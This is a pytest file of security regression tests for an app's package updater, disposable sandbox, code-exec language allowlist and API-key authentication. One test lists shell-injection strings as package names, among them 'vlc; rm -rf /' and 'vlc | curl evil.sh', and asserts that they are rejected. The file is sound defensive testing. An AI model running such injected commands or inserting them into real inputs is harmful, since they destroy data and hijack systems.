"""
Security regression tests for the fixes applied in the security audit:

1. DeepOSController.check_and_update_software rejects shell metacharacters.
2. DisposableSandbox.run_in_sandbox bounds command length and timeout.
3. Code-exec endpoint rejects unknown languages and oversized code.
4. API routers are gated behind verify_api_key (auth dependency applied).
"""

import subprocess
import pytest
from unittest.mock import patch

from app.tools.deep_os_controller import DeepOSController
from app.tools.disposable_sandbox import DisposableSandbox


def test_rejects_shell_injection_in_package_name():
    """Shell metacharacters in package names must be rejected before any subprocess."""
    malicious = ["vlc; rm -rf /", "vlc && whoami", "vlc$(reboot)", "vlc`id`", "vlc | curl evil.sh"]
    for pkg in malicious:
        res = DeepOSController.check_and_update_software(pkg)
        assert res["success"] is False
        assert "Invalid package name" in res.get("error", "")


def test_accepts_legitimate_package_name():
    with patch("app.policy.PolicyEvaluator.evaluate_action", return_value=(True, "allowed", 3)), \
         patch(
             "app.tools.deep_os_controller.run_cancellable_subprocess",
             return_value=subprocess.CompletedProcess(["update"], 0, "", ""),
         ):
        res = DeepOSController.check_and_update_software("vlc")
        # With policy allowing it, it proceeds to execution (no shell=True).
        assert res["success"] is True


def test_rejects_non_string_package_name():
    res = DeepOSController.check_and_update_software(None)
    assert res["success"] is False
    assert "Invalid package name" in res.get("error", "")


def test_sandbox_rejects_oversized_command(tmp_path):
    from app.config import settings
    # Point DATA_DIR at tmp so create_sandbox can run.
    with patch.object(settings, "DATA_DIR", tmp_path):
        sb = DisposableSandbox.create_sandbox()
        sandbox_id = sb["sandbox_id"]

        huge = "echo " + "x" * (DisposableSandbox.MAX_COMMAND_LENGTH + 10)
        res = DisposableSandbox.run_in_sandbox(sandbox_id, huge)
        assert res["success"] is False
        assert "maximum length" in res.get("error", "")


def test_sandbox_rejects_empty_command(tmp_path):
    from app.config import settings
    with patch.object(settings, "DATA_DIR", tmp_path):
        sb = DisposableSandbox.create_sandbox()
        res = DisposableSandbox.run_in_sandbox(sb["sandbox_id"], "   ")
        assert res["success"] is False


def test_code_exec_language_allowlist():
    """Unknown languages are rejected (no silent `cat` fallback)."""
    from backend.api.phase6_routes import EXEC_LANGUAGES
    assert "python" in EXEC_LANGUAGES
    assert "rm" not in EXEC_LANGUAGES
    assert "sh" not in EXEC_LANGUAGES  # only 'bash' is allowed


def test_api_routers_have_auth_dependency():
    """Every API router — AND the core router — must carry the auth dependency.

    P0 fix: previously the 127-route core router (chat, tools, tasks, models)
    was registered WITHOUT verify_api_key, leaving a large capability surface
    unauthenticated even when ARENA_API_KEY was set. Now it is gated too.
    """
    import app.server as server

    routes = {
        getattr(route, "path", ""): route
        for route in server.app.routes
    }
    for path in ("/api/status", "/api/wakeword/models", "/conversations"):
        route = routes[path]
        dependencies = getattr(getattr(route, "dependant", None), "dependencies", [])
        assert dependencies, f"Expected {path} to carry API-key verification"
